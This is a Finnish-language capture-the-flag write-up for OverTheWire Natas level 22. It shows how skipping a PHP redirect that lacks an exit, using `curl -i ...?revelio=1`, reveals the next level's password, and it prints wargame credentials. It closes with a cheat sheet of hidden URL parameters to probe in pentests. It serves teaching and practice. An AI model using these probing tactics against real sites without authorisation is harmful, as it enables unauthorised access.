# natas 22 - START HERE;

Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

![alt text](./kuvat-level22-28/natas22-0.png)


Ekana tyhjä sivu ja pelkä "view sourcecode".
Tässä tasossa voi koskien tuota PHP-session istuntoa jälleen kerran ja tarkistaa onko URL parametri `?revelio=..` mikäli paljastuu tai paljastaa sitten suoriuttuu jotenkin admin = 1 , josta saa käyttäjä saa sitten natas22 salasansa.


```
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
```

![alt text](./kuvat-level22-28/natas22-1.png)



Tässä ei mainittu **debug** sanaa, koska aikaisemmissa oli lisätty url perään `?debug` ja kokeillaan sijoittaa **revelio**. (Testattu: http://natas22.natas.labs.overthewire.org/?revelio=1) josta välähti pikaisesti ja palattin tähän natas22 etusivulle.

Ensimmäisessä kirjauduttu ainakin sen natas22 eävste PHPSESSID: 81tu6j4hevs6uffovnlm3o9vbf

```
┌──(kali㉿kali)-[~]
└─$ echo -n 81tu6j4hevs6uffovnlm3o9vbf | xxd -r -p
�                                                                                                                                                 
```

## Kali linxu tarkistusta 

```
┌──(kali㉿kali)-[~]
└─$ curl -v -Headers "Referer: http://natas22.natas.labs.overthewire.org/" http://natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz@natas22.natas.labs.overthewire.org
* URL rejected: Malformed input to a URL function
* Closing connection
curl: (3) URL rejected: Malformed input to a URL function
* Host natas22.natas.labs.overthewire.org:80 was resolved.
* IPv6: (none)
* IPv4: 13.50.19.111
*   Trying 13.50.19.111:80...
* Connected to natas22.natas.labs.overthewire.org (13.50.19.111) port 80
* Server auth using Basic with user 'natas22'
> GET / HTTP/1.1
> Host: natas22.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMyMjpkOHJ3R0JsMFhzbGczYjc2dWgzZkViU2xuT1VCbG96eg==
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Fri, 18 Jul 2025 12:10:36 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Set-Cookie: PHPSESSID=j2rnpfveneqfttdbv2jl7o45f2; path=/; HttpOnly
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 896
< Content-Type: text/html; charset=UTF-8
< 


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas22.natas.labs.overthewire.org left intact

┌──(kali㉿kali)-[~]
└─$ curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz --referer http://natas23.natas.labs.overthewire.org/ http://natas22.natas.labs.overthewire.org


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


MItä tämä tosiaan tekekään: `curl -i --user natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio=1"` <br>
- `-i` näyttää http hederit
- `--user` kirjauduttaan sisään millä tunnuksella <username:password> sitten "http-url" ja `/?revelio=1`

```
┌──(kali㉿kali)-[~]
└─$ curl -i --user natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio=1"
HTTP/1.1 302 Found
Date: Fri, 18 Jul 2025 12:32:54 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=mnv6949mir0vverielcbtbt54l; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /
Content-Length: 1028
Content-Type: text/html; charset=UTF-8



<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

**Miksi tämä toimii näin?**
- vaikka siinä php koodissa on mainittu lähettää `location: /` headeriä, mutta se ei lopeta skriptiä. 
- curl komennossa ei seuraa uudelleen ohjausta automaattisesti, niin se näyttää koko vastauksen ja mukaan lukien salasanansa.
- Pieni pohdintana olisiko pitänyt tietää tämä vastaus kuitenkin että sijoittaa ton parametrin perään vaan ja sitten mukaan curl -i natas 22 käyttäjä.



tässä komennossa tapahtuu `-L` seuraa redirectejä ja `--max-redirs 0` tarkoittaa estää redirectin seuraamisen:
- `curl -i -L --max-redirs 0 --user natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio=1"`

```
┌──(kali㉿kali)-[~]
└─$ curl -i -L --max-redirs 0 --user natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio=1"
HTTP/1.1 302 Found
Date: Fri, 18 Jul 2025 12:51:00 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=31d2602ulvfpmhrc177img5on8; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /
Content-Length: 1028
Content-Type: text/html; charset=UTF-8

curl: (47) Maximum (0) redirects followed
```
                                                                                                                                                  
---

## curl komentoja CTF ja pentest tilassa
lisä lunttilappun tarkistus listaan

Tämä on malli pohja: 
- `curl -i --user natas22:<salasana> "http://natas22.natas.labs.overthewire.org/?debug=1"`

Jos sivustolla ois tai koodin pätkässä `debug` parametri sana, niin se saattaa aktivoida lisäinformaation tai virheilmoitusta. `curl -i` näyttää ne suoraan, vaikka selain ei niitä näyttäisikään.

Muutama curl taktinen CTF- ja pentest tilanteissa ja tämä on normi testausta web-sovelluksien kanssa on hyvä myös kokeilla:

- `curl -i` tai `curl -v` nähdäkseen kaiken

sitten parametreja eli url perässä:
- `?debug=1`
- `?admin=1`
- `?reveal=true`
- `?source=1`
- `?test=1`
- `?show=all`

Sekä nämä voivat paljastaa kehittäjien jättämiä takaporttej tai testikoodeja.


## 🧭 Polku PHP-koodissa (Natas-harjoitukset)

Tässä muistiinpano koskee view source -välilehden (index-source.html) PHP-koodia Natas-tasoissa. Niissä koodi sisältää erityisiä URL-parametreja, jotka eivät näy sivulla normaalisti, mutta ne kytkevät salaisen toiminnon päälle. Niitä voi käyttää vain tietyissä tilanteissa, ja niihin liittyy istunto (session) tai eväste.

### 🔐 Esimerkki Natas22: revelio

```
if(array_key_exists("revelio", $_GET)) {
  if(!($_SESSION and $_SESSION["admin"] == 1)) {
    header("Location: /");
  }
}
```

→ Tässä parametri `revelio` toimii salaisuutena, mutta sen käyttö vaatii, että istunnossa on admin-oikeudet (`$_SESSION["admin"] == 1`). Muuten selain ohjataan takaisin alkuun. Eli pelkkä URL-parametri ei riitä — pitää myös huijata sessiota.


### 🧪 Esimerkki Natas20: debug

```
if(array_key_exists("debug", $_GET)) {
  print "DEBUG: $msg<br>";
}
```

→ Parametri `debug` ei paljasta salasanaa suoraan, mutta näyttää lisätietoja, kuten mitä istunnon sisällä tapahtuu, ja miten session-tiedosto rakentuu. Tämä voi auttaa ratkaisemaan tehtävää.


## ❓ Miksi kysymysmerkki (?) pitää olla URL:ssa ennen parametreja?

Koska se aloittaa query stringin eli GET-pyynnön parametrit. Esimerkiksi: `http://natas22.natas.labs.overthewire.org/index.php?revelio`


Ilman kysymysmerkkiä selain ei lähetä parametreja ollenkaan, eikä PHP:n `$_GET`-taulukossa ole mitään.


## 🧠 Yhteenveto

- Parametrit kuten revelio ja debug toimivat salaisina kytkiminä.
- Ne pitää lisätä URL:iin kysymysmerkin jälkeen.
- Oikeanlaisen tuloksen saaminen voi vaatia istunnon muokkausta (admin=1) tai debug-tulosteiden analysointia.
- Molemmat tasot perustuvat samaan ideaan: piilotetut URL-parametrit aktivoivat toiminnon, jota ei normaalisti näe.
